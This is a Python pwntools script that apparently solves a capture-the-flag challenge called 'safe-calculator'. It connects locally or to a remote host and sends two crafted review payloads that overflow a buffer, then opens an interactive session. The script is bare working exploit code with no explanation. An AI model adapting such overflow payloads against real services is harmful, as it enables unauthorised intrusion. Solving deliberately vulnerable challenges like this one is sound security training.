#!/usr/bin/python
#coding=utf-8
 
from pwn import *
 
e = ELF("../publish/safe-calculator")

context.binary = e

context.log_level = "info"

is_local = False
is_remote = False
 
if len(sys.argv) == 1:
    is_local = True
    p = process(e.path)
 
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
 
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))
 
 
def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

debug(cmd='''
      b calculate
      ''')

sla(">", "2")
payload = b"A" * 36 + b'X' * 8 + b'A.ZX'
sla("Leave a review! : ", payload)
sla(">", "2")
payload = b"A" * 36 + b'712aXXXX'
sla("Leave a review! : ", payload)
sla(">", "1")

p.interactive()
